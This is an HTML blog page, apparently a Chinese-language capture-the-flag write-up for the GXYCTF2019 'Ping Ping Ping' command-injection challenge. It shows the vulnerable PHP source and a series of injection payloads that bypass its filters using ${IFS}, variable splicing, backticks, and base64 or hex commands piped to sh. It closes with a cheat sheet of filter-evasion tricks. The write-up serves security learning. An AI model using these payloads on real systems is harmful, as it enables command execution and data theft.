@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="[GXYCTF2019]Ping Ping Ping​?ip&#x3D;127.0.0.1;ls​  &#x2F;?ip&#x3D; PING 127.0.0.1 (127.0.0.1): 56 data bytes flag.php index.php 滤了空格和标点，flag等符号，不能直接cat flag  ‍ ​?ip&#x3D;127.0.0.1;cat flag.php​  &#x2F;?ip&#x3D; fxck your">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/[GXYCTF2019]Ping%20Ping%20Ping/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="[GXYCTF2019]Ping Ping Ping​?ip&#x3D;127.0.0.1;ls​  &#x2F;?ip&#x3D; PING 127.0.0.1 (127.0.0.1): 56 data bytes flag.php index.php 滤了空格和标点，flag等符号，不能直接cat flag  ‍ ​?ip&#x3D;127.0.0.1;cat flag.php​  &#x2F;?ip&#x3D; fxck your">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/.com//b1bf09fa6702388534a63ae4b934053c-20250416004020-dh62fi5.png">
+<meta property="article:published_time" content="2025-05-20T00:55:54.000Z">
+<meta property="article:modified_time" content="2025-05-20T00:55:54.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/.com//b1bf09fa6702388534a63ae4b934053c-20250416004020-dh62fi5.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Web/注入漏洞/命令注入/[GXYCTF2019]Ping Ping Ping" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%5BGXYCTF2019%5DPing%20Ping%20Ping/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>​<code>?ip=127.0.0.1;ls</code>​</p>
+<blockquote>
+<p>&#x2F;?ip=<br> PING 127.0.0.1 (127.0.0.1): 56 data bytes<br> flag.php<br> index.php</p>
+<p>滤了空格和标点，flag等符号，不能直接cat flag</p>
+</blockquote>
+<p>‍</p>
+<p>​<code>?ip=127.0.0.1;cat flag.php</code>​</p>
+<blockquote>
+<p>&#x2F;?ip= fxck your space!</p>
+<p>过滤了空格，用<code>$&#123;IFS&#125;$</code>​代替</p>
+</blockquote>
+<p>‍</p>
+<p>​<code>?ip=127.0.0.1;cat$IFSflag.php	</code>​</p>
+<blockquote>
+<p>&#x2F;?ip= fxck your flag!</p>
+</blockquote>
+<p>‍</p>
+<p>不读flag，读index</p>
+<blockquote>
+<p>?ip&#x3D;127.0.0.1;cat$IFS$1index.php</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">PING <span class="number">127.0</span>.<span class="number">0.1</span> (<span class="number">127.0</span>.<span class="number">0.1</span>): <span class="number">56</span> data bytes</span><br><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>总结：过滤的特殊字符：</strong></p>
+<blockquote>
+<p>&amp; &#x2F; ？ * &lt; x{00}-\x{1f} ‘ “ \ () [] {}  空格<br>“xxxfxxxlxxxaxxxgxxx” “ “ “bash”</p>
+</blockquote>
+<p>flag的贪婪匹配，匹配一个字符串中，是否按顺序出现过flag四个字母</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br></pre></td></tr></table></figure></blockquote>
+<p>源码中有一个$a变量可以覆盖</p>
+<blockquote>
+<p>?ip&#x3D;127.0.0.1;a&#x3D;f;cat$IFS$1$alag.php    过滤<br>?ip&#x3D;127.0.0.1;a&#x3D;l;cat$IFS$1f$aag.php	没flag<br>?ip&#x3D;127.0.0.1;a&#x3D;a;cat$IFS$1fl$ag.php  	过滤<br>?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php	有flag<br>?ip&#x3D;127.0.0.1;a&#x3D;fl;b&#x3D;ag;cat$IFS$1$a$b.php 过滤<br>?ip&#x3D;127.0.0.1;b&#x3D;ag;a&#x3D;fl;cat$IFS$1$a$b.php 有flag</p>
+</blockquote>
+<p>变量替换顺序，效果也不一样</p>
+<h3 id="1、简单变量替换，用-a覆盖拼接flag"><a href="#1、简单变量替换，用-a覆盖拼接flag" class="headerlink" title="1、简单变量替换，用$a覆盖拼接flag"></a>1、简单变量替换，用$a覆盖拼接flag</h3><p>​<code>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code>​</p>
+<p>​<code>查看源码</code>​</p>
+<p>&#x2F;?ip=</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes &lt;?php $flag =</span><br><span class="line"></span><br><span class="line">“flag&#123;d893b431-5300-4b46-9b52-3a5a2390cfca&#125;”; ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h3 id="2、变量ab互换传递，绕过字符串匹配，实现拼接"><a href="#2、变量ab互换传递，绕过字符串匹配，实现拼接" class="headerlink" title="2、变量ab互换传递，绕过字符串匹配，实现拼接"></a>2、变量ab互换传递，绕过字符串匹配，实现拼接</h3><p>​<kbd>?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php</kbd>​</p>
+<p>​<kbd>?ip=127.0.0.1;b=lag;a=f;cat$IFS$a$b.php</kbd>​</p>
+<p>‍</p>
+<h3 id="3、内联执行"><a href="#3、内联执行" class="headerlink" title="3、内联执行"></a>3、内联执行</h3><blockquote>
+<p>?ip&#x3D;127.0.0.1;cat$IFS<code>ls</code>​<br>?ip&#x3D;127.0.0.1;cat$IFS$3<code>ls</code>​<br>?ip&#x3D;127.0.0.1;cat$IFS$9<code>ls</code>​<br>?ip&#x3D;127.0.0.1|cat$IFS$9<code>ls</code>​</p>
+</blockquote>
+<p>‍</p>
+<h3 id="4、被过滤的bash，用管道-sh替换"><a href="#4、被过滤的bash，用管道-sh替换" class="headerlink" title="4、被过滤的bash，用管道+sh替换"></a>4、被过滤的bash，用管道+sh替换</h3><p>cat flag.php用base64加密来绕过正则匹配</p>
+<blockquote>
+<p>Y2F0IGZsYWcucGhw</p>
+</blockquote>
+<blockquote>
+<p>?ip&#x3D;127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</p>
+</blockquote>
+<p>&#x2F;&#x2F;?ip= fxck your bash!</p>
+<p> 过滤了flag、bash，但sh没过滤，linux下可用sh</p>
+<p>​<code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code>​</p>
+<p>|sh 就是执行前面的echo脚本</p>
+<p>‍</p>
+<h3 id="5、类似题的大概思路"><a href="#5、类似题的大概思路" class="headerlink" title="5、类似题的大概思路"></a>5、类似题的大概思路</h3><blockquote>
+<p>cat fl*  用<em>匹配任意<br>cat fla</em> 用*匹配任意<br>ca\t fla\g.php        反斜线绕过<br>cat fl’’ag.php        两个单引号绕过<br>echo “Y2F0IGZsYWcucGhw” | base64 -d | bash<br>&#x2F;&#x2F;base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数</p>
+<p>echo “63617420666c61672e706870” | xxd -r -p | bash<br>&#x2F;&#x2F;hex编码绕过(引号可以去掉)</p>
+<p>echo “63617420666c61672e706870” | xxd -r -p | sh<br>&#x2F;&#x2F;sh的效果和bash一样</p>
+<p>cat fl[a]g.php       用[]匹配</p>
+<p>a&#x3D;fl;b&#x3D;ag;cat $a$b          变量替换<br>cp fla{g.php,G}    把flag.php复制为flaG<br>ca${21}t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),${x}(x&gt;&#x3D;10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的</p>
+</blockquote>
+<p>‍</p>
+<p>通配符</p>
+<blockquote>
+<ul>
+<li>#匹配全部字符，通配符<br>?    #任意一个字符，通配符<br>[]      #表示一个范围（正则，通配符）<br>{}      #产生一个序列（通配符）</li>
+</ul>
+</blockquote>
+<p><img src="/.com//b1bf09fa6702388534a63ae4b934053c-20250416004020-dh62fi5.png" alt="b1bf09fa6702388534a63ae4b934053c"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/[GXYCTF2019]Ping%20Ping%20Ping/" data-id="cmawal1ji002sbo7k2fu7e9l6" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/HTTP%E6%95%99%E7%A8%8B/">HTTP教程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/PHP%E5%AE%89%E5%85%A8/">PHP安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/XSS/">XSS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></li></ul></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E9%A2%98%E7%9B%AE/" rel="tag">CTF题目</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Content-Type/" rel="tag">Content-Type</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/labs/" rel="tag">labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" rel="tag">比较漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" rel="tag">网络协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" rel="tag">跨站脚本</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF%E9%A2%98%E7%9B%AE/" style="font-size: 10px;">CTF题目</a> <a href="/tags/Content-Type/" style="font-size: 10px;">Content-Type</a> <a href="/tags/HTTP/" style="font-size: 13.33px;">HTTP</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHP/" style="font-size: 16.67px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/XSS/" style="font-size: 20px;">XSS</a> <a href="/tags/XSStrike/" style="font-size: 10px;">XSStrike</a> <a href="/tags/labs/" style="font-size: 10px;">labs</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13.33px;">反序列化</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">安全</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 10px;">实战</a> <a href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">对象注入</a> <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">报错注入</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">比较漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">网络协议</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 10px;">网络安全</a> <a href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" style="font-size: 10px;">跨站脚本</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
